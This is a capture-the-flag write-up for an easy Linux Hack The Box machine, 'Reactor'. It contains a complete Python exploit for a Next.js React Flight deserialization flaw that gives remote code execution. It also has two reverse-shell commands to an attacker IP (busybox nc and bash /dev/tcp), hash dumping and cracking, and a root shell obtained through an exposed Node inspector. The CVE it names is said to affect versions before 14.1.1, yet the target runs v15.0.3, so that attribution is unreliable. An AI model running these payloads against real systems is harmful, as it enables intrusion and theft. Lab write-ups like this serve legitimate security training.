
# #HTB 


![[Pasted image 20260725204151.png|281]]

# HTB: Reactor


**Machine IP:** `10.129.1.50`  
**Difficulty:** Easy  
**OS:** Linux

---

## Step 1: Reconnaissance - Port Scanning

### Nmap Results:

```
nmap -T5 --open 10.129.1.50
```

**Open Ports:**
```
22/tcp   - SSH
3000/tcp - HTTP
```

### Nmap Detailed Scan:

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 9.6p1 Ubuntu|
|3000/tcp|HTTP|Next.js Application|

![[Pasted image 20260725183427.png]]

**Add to /etc/hosts:**
```
echo "10.129.1.50 reactor.htb" | sudo tee -a /etc/hosts
```


---

## Step 2: Web Application Enumeration

**Website:** `http://reactor.htb:3000`

The site displays a nuclear reactor monitoring dashboard:
- **Application:** ReactorWatch Core Monitoring System
- **Framework:** Next.js
- **Version:** v15.0.3

### Source Code Analysis:

```
curl -s "http://reactor.htb:3000/_next/static/L3bimJe_3LvBcFWAnK5L4/_buildManifest.js"
```


![[Pasted image 20260725183807.png]]
- **Key Finding:** The application uses Next.js with Pages Router architecture.

---

## Step 3: Vulnerability Discovery

#### CVE-2024-34343 - Next.js React Flight RCE


> **CVE-2024-34343:** Next.js versions before 14.1.1 are vulnerable to a deserialization issue in React Flight that allows attackers to execute arbitrary JavaScript code.

This vulnerability allows escaping the React Flight sandbox and executing arbitrary commands, leading to Remote Code Execution (RCE).

---

## Step 4: Exploitation - RCE via React Flight

### Exploit Script:

```python
# exploit.py
import requests, sys, json

BASE_URL = sys.argv[1]
EXECUTABLE = sys.argv[2]

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {"get": "$1:constructor:constructor"},
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"')
}

headers = {"Next-Action": "x"}

requests.post(BASE_URL, files=files, headers=headers)
```


![[Pasted image 20260725183845.png]]

### Execute Exploit:

```bash
# Start listener
nc -lvnp 4444

# Run exploit
python3 exploit.py http://reactor.htb:3000 "busybox nc 10.10.14.31 4444 -e /bin/sh"
```


### Reverse Shell Received:

-  `node@reactor:/opt/reactor-app$`

---

## Step 5: Database Credentials Extraction

```bash
node@reactor:/opt/reactor-app$ ls
reactor.db  package.json  node_modules

node@reactor:/opt/reactor-app$ sqlite3 reactor.db
```


![[Pasted image 20260725183901.png]]

**Database Contents:**
```sql
sqlite> SELECT * FROM users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

**Credentials Found:**

|ID|Username|Hash|Role|
|---|---|---|---|
|1|admin|a203b22191d744a4e70ada5c101b17b8|Administrator|
|2|engineer|39d97110eafe2a9a68639812cd271e8e|Operator|

---

## Step 6: Cracking Password Hashes

**Hash Format:** MD5

### Using Hashcat:

```bash
hashcat -m 0 -a 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt engineer_hash.txt
```

- **Cracked Password:** `reactor1`

![[Pasted image 20260725183921.png]]


---

## Step 7: SSH Access as Engineer

```bash
ssh engineer@reactor.htb
Password: reactor1
```


---

## Step 8: User Flag

```bash
engineer@reactor:~$ ls
user.txt
engineer@reactor:~$ cat user.txt
52bf3ad9803d5dcd57e90f230619ca6a
```


![[Pasted image 20260725183936.png]]

- **User Flag:** `52bf3ad9803d5dcd57e90f230619ca6a`

---

## Step 9: Privilege Escalation - Node Inspector

### Process Enumeration:

```bash
engineer@reactor:~$ ps aux | grep node
root        1391  0.0  1.1 1066588 46056 ?       Ssl  12:04   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

**Key Finding:**
- Node.js process running as **root**
- Debugging interface enabled (`--inspect`)
- Listening on `127.0.0.1:9229`

### Check Debugger Status:

```
engineer@reactor:~$ curl -s http://127.0.0.1:9229/json
[{
  "description": "node.js instance",
  "id": "ccf0bb85-650a-442a-afc4-b05b259db81b",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/..."
}]
```


---

## Step 10: Node Inspector Exploitation

### Connect to Debugger:

```bash
engineer@reactor:~$ node inspect 127.0.0.1:9229
```

### Spawn Root Shell:

```bash
# Start listener in new terminal
nc -lvnp 4445

# Execute reverse shell from debugger
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.31/4445 0>&1\"')")
```


![[Pasted image 20260725183951.png]]


---

## Step 11: Root Flag

```bash
root@reactor:~# cat /root/root.txt
d42a4e197e66b3f02b58f2aa42100e06
```

![[Pasted image 20260725184003.png]]

- **Root Flag:** `d42a4e197e66b3f02b58f2aa42100e06`


---
---

